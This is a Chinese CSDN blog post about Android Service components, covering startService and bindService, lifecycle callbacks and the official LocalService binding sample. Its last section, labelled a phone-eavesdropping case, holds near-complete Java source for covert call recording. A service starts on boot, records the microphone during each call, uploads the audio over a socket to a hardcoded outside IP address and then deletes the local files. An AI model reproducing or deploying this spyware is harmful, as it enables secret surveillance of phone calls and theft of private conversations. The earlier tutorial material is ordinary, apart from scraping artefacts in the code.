# Service组件 startService() bindService() - 三少GG - CSDN博客
2012年03月20日 20:07:03[三少GG](https://me.csdn.net/scut1135)阅读数：1422
Service和其他的应用组件一样，运行在进程的主线程中。这就是说如果service需要很多耗时或者阻塞的操作，需要在其子线程中实现。
**有了 Service 类我们如何启动他呢，有两种方法：**
 • Context.startService() 
 • Context.bindService()
 1.  在同一个应用任何地方调用 startService() 方法就能启动 Service 了，然后系统会回调 Service 类的 onCreate() 以及 onStart() 方法。这样启动的 Service 会一直运行在后台，直到 Context.stopService()
 或者 selfStop() 方法被调用。另外如果一个 Service 已经被启动，其他代码再试图调用 startService() 方法，是不会执行 onCreate() 的，但会重新执行一次 onStart() 。
 2. 另外一种 bindService() 方法的意思是，把这个 Service 和调用 Service 的客户类绑起来，如果调用这个客户类被销毁，Service 也会被销毁。用这个方法的一个好处是，bindService() 方法执行后 Service 会回调上边提到的 onBind()
 方发，你可以从这里返回一个实现了 IBind 接口的类，在客户端操作这个类就能和这个服务通信了，比如得到 Service 运行的状态或其他操作。如果 Service 还没有运行，使用这个方法启动 Service 就会onCreate() 方法而不会调用 onStart()。
总结：
1. startService()的目的是回调onStart()方法，onCreate() 方法是在Service不存在的时候调用的，如果Service存在（例如之前调用了bindService，那么Service的onCreate方法已经调用了）那么startService()将跳过onCreate()
 方法。
 2.  bindService()目的是回调onBind()方法，它的作用是在Service和调用者之间建立一个桥梁，并不负责更多的工作（例如一个Service需要连接服务器的操作），一般使用bindService来绑定到一个现有的Service（即通过StartService启动的服务）。
关于Service生命周期
Android Service生命周期与Activity生命周期是相似的，但是也存在一些细节上也存在着重要的不同：
**onCreate和onStart是不同的**
通过从客户端调用Context.startService(Intent)方法我们可以启动一个服务。如果这个服务还没有运行，Android将启动它并且在onCreate方法之后调用它的onStart方法。如果这个服务已经在运行，那么它的onStart方法将被新的Intent再次调用。所以对于单个运行的Service它的onStart方法被反复调用是完全可能的并且是很正常的。
onResume、onPause以及onStop是不需要的
回调一个服务通常是没有用户界面的，所以我们也就不需要onPause、onResume或者onStop方法了。无论何时一个运行中的Service它总是在后台运行。
**onBind**
如果一个客户端需要持久的连接到一个服务，那么他可以调用Context.bindService方法。如果这个服务没有运行方法将通过调用onCreate方法去创建这个服务但并不调用onStart方法来启动它。相反，onBind方法将被客户端的Intent调用，并且它返回一个IBind对象以便客户端稍后可以调用这个服务。同一服务被客户端同时启动和绑定是很正常的。
**onDestroy**
与Activity一样，当一个服务被结束是onDestroy方法将会被调用。当没有客户端启动或绑定到一个服务时Android将终结这个服务。与很多Activity时的情况一样，当内存很低的时候Android也可能会终结一个服务。如果这种情况发生，Android也可能在内存够用的时候尝试启动被终止的服务，所以你的服务必须为重启持久保存信息，并且最好在onStart方法内来做。
应用场景：
**1. 本地服务 Local Service**用于应用程序内部。
它可以启动并运行，直至有人停止了它或它自己停止。在这种方式下，它以调用Context.startService()启动，而以调用Context.stopService()结束。它可以调用Service.stopSelf() 或 Service.stopSelfResult()来自己停止。不论调用了多少次startService()方法，你只需要调用一次stopService()来停止服务。
用于实现应用程序自己的一些耗时任务，比如查询升级信息，并不占用应用程序比如Activity所属线程，而是单开线程后台执行，这样用户体验比较好。
**2.远程服务 Remote Service** 用于android**系统内部**的应用程序之间。
它可以通过自己定义并暴露出来的接口进行程序操作。客户端建立一个到服务对象的连接，并通过那个连接来调用服务。连接以调用Context.bindService()方法建立，以调用 Context.unbindService()关闭。多个客户端可以绑定至同一个服务。如果服务此时还没有加载，bindService()会先加载它。
可被其他应用程序复用，比如天气预报服务，其他应用程序不需要再写这样的服务，调用已有的即可。
服务不能自己运行，需要通过调用Context.startService()或Context.bindService()方法启动服务。这两个方法都可以启动Service，但是它们的使用场合有所不同。
**1. 使用startService()方法启用服务，调用者与服务之间没有关连，即使调用者退出了，服务仍然运行。**
    如果打算采用Context.startService()方法启动服务，在服务未被创建时，系统会先调用服务的onCreate()方法，接着调用onStart()方法。
    如果调用startService()方法前服务已经被创建，多次调用startService()方法并不会导致多次创建服务，但会导致多次调用onStart()方法。
    采用startService()方法启动的服务，只能调用Context.stopService()方法结束服务，服务结束时会调用onDestroy()方法。
** 2. 使用bindService()方法启用服务，调用者与服务绑定在了一起，调用者一旦退出，服务也就终止，**大有“不求同时生，必须同时死”的特点。
    onBind()只有采用Context.bindService()方法启动服务时才会回调该方法。该方法在调用者与服务绑定时被调用，当调用者与服务已经绑定，多次调用Context.bindService()方法并不会导致该方法被多次调用。
    采用Context.bindService()方法启动服务时只能调用onUnbind()方法解除调用者与服务解除，服务结束时会调用onDestroy()方法。
看看官方给出的比较流程示意图：
![&#20004;&#31181;&#27604;&#36739;](http://android.blog.51cto.com/attachment/201103/004355525.png)
    官方文档告诉我们，一个service可以同时start并且bind，在这样的情况，系统会一直保持service的运行状态如果service已经start了或者BIND_AUTO_CREATE标志被设置。如果没有一个条件满足，那么系统将会调用onDestory方法来终止service.所有的清理工作（终止线程，反注册接收器）都在onDestory中完成。
例子：
本地服务和Activity交互
    对于这种case，官方的sample(APIDemo\app.LocalService)是最好的例子:
/** 
* This is an example of implementing an application service that runs locally 
* in the same process as the application.    The {@link LocalServiceController} 
* and {@link LocalServiceBinding} classes show how to interact with the 
* service. 
* 
* <p>Notice the use of the {@link NotificationManager} when interesting things 
* happen in the service.    This is generally how background services should 
* interact with the user, rather than doing something more disruptive such as 
* calling startActivity(). 
*/
publicclass LocalService extends Service
 { 
private NotificationManager mNM; 
/** 
         * Class for clients to access.    Because we know this service always 
         * runs in the same process as its clients, we don't need to deal with 
         * IPC. 
         */
publicclass LocalBinder extends Binder
 {
LocalService getService() {
return LocalService.this;
                } 
        } 
        @Override 
publicvoid onCreate()
 { 
                mNM = (NotificationManager)getSystemService(NOTIFICATION_SERVICE); 
// Display a notification about us starting.    We put an icon in the
 status bar.
                showNotification(); 
        } 
        @Override 
publicint onStartCommand(Intent
 intent, int flags, int startId)
 { 
                Log.i("LocalService", "Received
 start id " + startId + ": " + intent); 
// We want this service to continue running until it is explicitly
// stopped, so return sticky.
return START_STICKY; 
        } 
        @Override 
publicvoid onDestroy()
 { 
// Cancel the persistent notification.
                mNM.cancel(R.string.local_service_started); 
// Tell the user we stopped.
                Toast.makeText(this, R.string.local_service_stopped, Toast.LENGTH_SHORT).show(); 
        } 
        @Override 
        public IBinder onBind(Intent intent) { 
             return mBinder;
        } 
// This is the object that receives interactions from clients.    See
// RemoteService for a more complete example.
privatefinal IBinder
 mBinder = new LocalBinder();
/** 
         * Show a notification while this service is running. 
         */
privatevoid showNotification()
 { 
// In this sample, we'll use the same text for the ticker and the expanded
 notification
                CharSequence text = getText(R.string.local_service_started); 
// Set the icon, scrolling text and timestamp
                Notification notification = new Notification(R.drawable.stat_sample,
 text, 
                                System.currentTimeMillis()); 
// The PendingIntent to launch our activity if the user selects this
 notification
                PendingIntent contentIntent = PendingIntent.getActivity(this,
 0, 
new Intent(this,
 LocalServiceController.class), 0); 
// Set the info for the views that show in the notification panel.
                notification.setLatestEventInfo(this, getText(R.string.local_service_label), 
                                             text, contentIntent); 
// Send the notification.
// We use a layout id because it is a unique number.    We use it later
 to cancel.
                mNM.notify(R.string.local_service_started, notification); 
        } 
}
   这里可以发现onBind需要返回一个IBinder对象。也就是说和上一例子LocalService不同的是，
1. 添加了一个public内部类继承Binder，并添加getService方法来返回当前的Service对象；
2. 新建一个IBinder对象——new那个Binder内部类；
3. onBind方法返还那个IBinder对象。
Activity:
/** 
* <p>Example of binding and unbinding to the {@link LocalService}. 
* This demonstrates the implementation of a service which the client will 
* bind to, receiving an object through which it can communicate with the service.</p> 
*/
publicclass LocalServiceBinding extends Activity
 { 
privateboolean mIsBound; 
private LocalService
 mBoundService; 
        @Override 
      protectedvoid onCreate(Bundle
 savedInstanceState) { 
super.onCreate(savedInstanceState); 
                setContentView(R.layout.local_service_binding); 
// Watch for button clicks.
                Button button = (Button)findViewById(R.id.bind); 
                button.setOnClickListener(mBindListener); 
                button = (Button)findViewById(R.id.unbind); 
                button.setOnClickListener(mUnbindListener); 
        } 
private ServiceConnection
 mConnection = new ServiceConnection() { 
public void onServiceConnected(ComponentName className, IBinder service) { 
// This is called when the connection with the service
 has been
// established, giving us the service object we can use to
// interact with the service.    Because we have bound to a explicit
// service that we know is running in our own process, we can
// cast its IBinder to a concrete class and directly access it.
                        mBoundService = ((LocalService.LocalBinder)service).getService(); 
// Tell the user about this for our demo.
                        Toast.makeText(LocalServiceBinding.this, R.string.local_service_connected, 
                                        Toast.LENGTH_SHORT).show(); 
                } 
public
 void onServiceDisconnected(ComponentName className) { 
// This is called when the connection with the
 service has been
// unexpectedly disconnected -- that is, its process crashed.
// Because it is running in our same process, we should never
// see this happen.
                        mBoundService = null; 
                        Toast.makeText(LocalServiceBinding.this, R.string.local_service_disconnected, 
                                        Toast.LENGTH_SHORT).show(); 
                } 
        }; 
private OnClickListener mBindListener = new OnClickListener()
 { 
publicvoid onClick(View
 v) { 
// Establish a connection with the service.    We use an explicit
// class name because we want a specific service implementation
 that
// we know will be running in our own process (and thus won't
 be
// supporting component replacement by other applications).
bindService(new Intent(LocalServiceBinding.this,    
                                        LocalService.class), mConnection,
 Context.BIND_AUTO_CREATE); 
                        mIsBound = true; 
                } 
        }; 
private OnClickListener mUnbindListener = new OnClickListener()
 { 
publicvoid onClick(View
 v) { 
if (mIsBound) { 
// Detach our existing connection.
unbindService(mConnection); 
                                mIsBound = false; 
                        } 
                } 
        }; 
}
    明显看出这里面添加了一个名为ServiceConnection类，并实现了onServiceConnected(从IBinder获取Service对象)和onServiceDisconnected(set Service to null)。
    而bindService和unbindService方法都是操作这个ServiceConnection对象的。
AndroidManifest.xml里添加:
<serviceandroid:name=".app.LocalService"/>
<activityandroid:name=".app.LocalServiceBinding"android:label="@string/activity_local_service_binding">
 <intent-filter>
<actionandroid:name="android.intent.action.MAIN"/>
<categoryandroid:name="android.intent.category.SAMPLE_CODE"/>
</intent-filter>
</activity>
这里没什么特别的，因为service没有需要什么特别的action，所以只是声明service而已，而activity和普通的没差别。
运行时，发现调用次序是这样的：
bindService:
1.LocalService : onCreate
2.LocalService : onBind
3.Activity: onServiceConnected
unbindService: 只是调用onDestroy
可见，onStart是不会被调用的，而onServiceDisconnected没有调用的原因在上面代码的注释有说明。
[Android之Service案例-电话窃听](http://blog.csdn.net/kesenhoo/article/details/6546220)
第一步：在功能清单文件AndroidManifest.xml中添加音频刻录权限：
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
第二步：编写音频刻录代码:
- MediaRecorder recorder = new MediaRecorder();  
-  recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//从麦克风采集声音
-  recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//内容输出格式
-  recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
-  recorder.setOutputFile("/mnt/sdcard/itcast.amr");  
-  recorder.prepare();//预期准备
-  recorder.start();   //开始刻录
-  ...  
-  recorder.stop();//停止刻录
-  recorder.reset();   //重设
-  recorder.release(); //刻录完成一定要释放资源
【2】电话窃听时使用手机麦克风进行录音，然后把录下的音频文件上传至指定的服务器
        代码示例：这里只显示客户端的代码
- publicclass PhoneListenService extends Service   
- {  
- privatestaticfinal String TAG = "PhoneListenService";  
- @Override
- publicvoid onCreate()   
-     {  
-         TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  
-         telManager.listen(new TelListener(), PhoneStateListener.LISTEN_CALL_STATE);  
-         Log.i(TAG, "service created");  
- super.onCreate();  
-     }  
- privateclass TelListener extends PhoneStateListener  
-     {  
- private MediaRecorder recorder;  
- private String mobile;  
- private File audioFile;  
- privateboolean record;  
- @Override
- publicvoid onCallStateChanged(int state, String incomingNumber)   
-         {  
- try
-             {  
- switch (state)  
-                 {  
- /* 无任何状态时 */
- case TelephonyManager.CALL_STATE_IDLE:   
- if(record)  
-                         {  
-                             recorder.stop();//停止刻录
-                             recorder.release();  
-                             record = false;  
- new Thread(new UploadTask()).start();  
-                             Log.i(TAG, "start upload file");  
-                         }  
- break;  
- /* 接起电话时 */
- case TelephonyManager.CALL_STATE_OFFHOOK:   
-                          Log.i(TAG, "OFFHOOK:"+ mobile);  
-                          recorder = new MediaRecorder();  
-                          recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//从麦克风采集声音
-                          recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//内容输出格式
-                          recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
- 
-                          audioFile = new File(getCacheDir(), mobile+"_"+ System.currentTimeMillis()+".3gp");  
-                          recorder.setOutputFile(audioFile.getAbsolutePath());  
-                          recorder.prepare(); //预期准备
-                          recorder.start();   //开始刻录
-                          record = true;  
- break;   
- /* 电话进来时 */
- case TelephonyManager.CALL_STATE_RINGING:   
-                         Log.i(TAG, "incomingNumber:"+ incomingNumber);  
-                         mobile = incomingNumber;  
- break;                        
- default:  
- break;  
-                 }  
-             }   
- catch (Exception e)  
-             {  
-                 Log.e(TAG, e.toString());  
-             }  
- super.onCallStateChanged(state, incomingNumber);  
-         }  
- 
- privatefinalclass UploadTask implements Runnable  
-         {  
- @Override
- publicvoid run()   
-             {  
- try
-                 {  
-                     Socket socket = new Socket("220.113.15.71", 7878);  
-                     OutputStream outStream = socket.getOutputStream();  
-                     String head = "Content-Length="+ audioFile.length() + ";filename="+ audioFile.getName() + ";sourceid=/r/n";  
-                     outStream.write(head.getBytes());  
- 
-                     PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());      
-                     String response = StreamTool.readLine(inStream);  
-                     String[] items = response.split(";");  
-                     String position = items[1].substring(items[1].indexOf("=")+1);  
- 
-                     RandomAccessFile fileOutStream = new RandomAccessFile(audioFile, "r");  
-                     fileOutStream.seek(Integer.valueOf(position));  
- byte[] buffer = newbyte[1024];  
- int len = -1;  
- while( (len = fileOutStream.read(buffer)) != -1)  
-                     {  
-                         outStream.write(buffer, 0, len);  
-                     }  
-                     fileOutStream.close();  
-                     outStream.close();  
-                     inStream.close();  
-                     socket.close();  
-                     audioFile.delete();  
-                 }   
- catch (Exception e)   
-                 {                      
-                     Log.e(TAG, e.toString());  
-                 }  
-             }  
-         }  
-     }  
- 
- //清空缓存目录下的所有文件
- @Override
- publicvoid onDestroy()   
-     {  
-         File[] files = getCacheDir().listFiles();  
- if(files!=null)  
-         {  
- for(File f: files)  
-             {  
-                 f.delete();  
-             }  
-         }  
-         Log.i(TAG, "Service Destroy");  
- super.onDestroy();  
-     }  
- 
- @Override
- public IBinder onBind(Intent intent)   
-     {  
- // TODO Auto-generated method stub
- returnnull;  
-     }  
- }  
- publicclass BootBroadcastReceiver extends BroadcastReceiver   
- {  
- @Override
- publicvoid onReceive(Context context, Intent intent)   
-     {  
-         Intent service = new Intent(context, PhoneListenService.class);  
-         context.startService(service);  
-     }  
- }  
- publicclass StreamTool   
- {      
- publicstaticvoid save(File file, byte[] data) throws Exception  
-      {  
-          FileOutputStream outStream = new FileOutputStream(file);  
-          outStream.write(data);  
-          outStream.close();  
-      }  
- 
- publicstatic String readLine(PushbackInputStream in) throws IOException   
-      {  
- char buf[] = newchar[128];  
- int room = buf.length;  
- int offset = 0;  
- int c;  
- loop:       while (true) {  
- switch (c = in.read()) {  
- case -1:  
- case'/n':  
- break loop;  
- case'/r':  
- int c2 = in.read();  
- if ((c2 != '/n') && (c2 != -1)) in.unread(c2);  
- break loop;  
- default:  
- if (--room < 0) {  
- char[] lineBuffer = buf;  
-                             buf = newchar[offset + 128];  
-                             room = buf.length - offset - 1;  
-                             System.arraycopy(lineBuffer, 0, buf, 0, offset);  
- 
-                         }  
-                         buf[offset++] = (char) c;  
- break;  
-                 }  
-             }  
- if ((c == -1) && (offset == 0)) returnnull;  
- return String.copyValueOf(buf, 0, offset);  
-     }  
- 
- /**
-     * 读取流
-     * @param inStream
-     * @return 字节数组
-     * @throws Exception
-     */
- publicstaticbyte[] readStream(InputStream inStream) throws Exception  
-     {  
-             ByteArrayOutputStream outSteam = new ByteArrayOutputStream();  
- byte[] buffer = newbyte[1024];  
- int len = -1;  
- while( (len=inStream.read(buffer)) != -1)  
-             {  
-                 outSteam.write(buffer, 0, len);  
-             }  
-             outSteam.close();  
-             inStream.close();  
- return outSteam.toByteArray();  
-     }  
- }
